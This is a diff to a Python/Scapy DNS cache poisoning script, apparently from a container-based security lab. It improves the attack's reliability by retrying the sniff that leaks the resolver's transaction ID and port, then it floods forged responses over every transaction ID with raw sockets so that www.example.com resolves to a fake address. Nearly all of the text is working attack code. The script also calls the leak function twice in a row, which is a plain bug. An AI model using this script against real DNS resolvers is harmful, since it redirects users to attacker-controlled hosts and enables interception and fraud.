@@ -7,35 +7,58 @@ import random
 target_dns = "10.9.0.53"
 # Now spoofing example-dns (10.9.0.154) which root-dns delegates example.com to
 auth_dns = "10.9.0.154"
+attacker_dns = "10.9.0.155"
+leak_ns_ip = "10.9.0.10"
 domain = "www.example.com"
 fake_ip = "6.6.6.6" 
 
 print("[*] 1 & 2. Sniffing for predictable TXID and Port on a controlled domain...")
-# Start sniffer in background
-def sniff_port_and_txid():
-    sniffer = AsyncSniffer(iface=None, filter="udp and src host " + target_dns + " and dst port 53", count=1, timeout=10)
-    sniffer.start()
-    time.sleep(0.5)
 
-    # Send query for a domain we control to leak the port and current TXID
-    # local-dns -> root-dns (.153) -> attacker-dns (.155) -> attacker machine (.10)
-    trigger_leak = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname=str(random.randint(0,10000)) + ".leak.attacker.com"))
-    send(trigger_leak, verbose=0)
+def sniff_port_and_txid(max_attempts=5):
+    for attempt in range(1, max_attempts + 1):
+        print("[*] Leak attempt {}/{}...".format(attempt, max_attempts))
+        sniffer = AsyncSniffer(
+            iface="eth0",
+            count=1,
+            timeout=3,
+            lfilter=lambda p: (
+                p.haslayer(IP)
+                and p.haslayer(UDP)
+                and p.haslayer(DNS)
+                and p[DNS].qr == 0
+                and p[IP].src == target_dns
+                and p[IP].dst == attacker_dns
+                and p[UDP].dport == 53
+            ),
+        )
+        sniffer.start()
+        time.sleep(0.1)
 
-    sniffer.join()
-    sniffed = sniffer.results
+        # local-dns -> root-dns (.153) -> attacker-dns (.155) -> attacker machine (.10)
+        qname = "{}.leak.attacker.com".format(random.randint(0, 2**31 - 1))
+        trigger_leak = (
+            IP(dst=target_dns)
+            / UDP(sport=random.randint(1024, 65535), dport=53)
+            / DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
+        )
+        send(trigger_leak, verbose=0)
 
-    if not sniffed or len(sniffed) == 0:
-        print("[-] Could not sniff packet. Make sure to run on the correct interface.")
-        exit(1)
-    leaked_txid = sniffed[0][DNS].id
-    target_port = sniffed[0][UDP].sport
-    print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
-    return leaked_txid, target_port  # BUG 1 was here — missing return
+        sniffer.join()
+        sniffed = sniffer.results
+        if sniffed and len(sniffed) > 0:
+            leaked_txid = sniffed[0][DNS].id
+            target_port = sniffed[0][UDP].sport
+            print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
+            return leaked_txid, target_port
+
+    print("[-] Could not sniff local-dns -> attacker-dns traffic on eth0.")
+    print("[-] You are likely running this from the wrong container.")
+    print("[-] Run it on attacker-dns, because local-dns sends the leak query to 10.9.0.155.")
+    print("[-] Example: podman exec -it attacker-dns python3 /attacks/Cache_poisoning.py")
+    exit(1)
 
 leaked_txid, target_port = sniff_port_and_txid()
 leaked_txid, target_port = sniff_port_and_txid()
-
 
 print("[*] 3. Sending request to resolve www.example.com...")
 trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
@@ -54,7 +77,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
 # Flood all possible TXIDs since it might be fully randomized or incrementing slightly
 for txid in range(0, 65536):
-    struct.pack_into('!H', raw_bytes, 28, leaked_txid + txid)  # Update TXID in the raw packet
+    struct.pack_into('!H', raw_bytes, 28, (leaked_txid + txid) & 0xFFFF)
     s.sendto(raw_bytes, (target_dns, 0))
 
 print("[*] 5. Testing if attack was successful...")
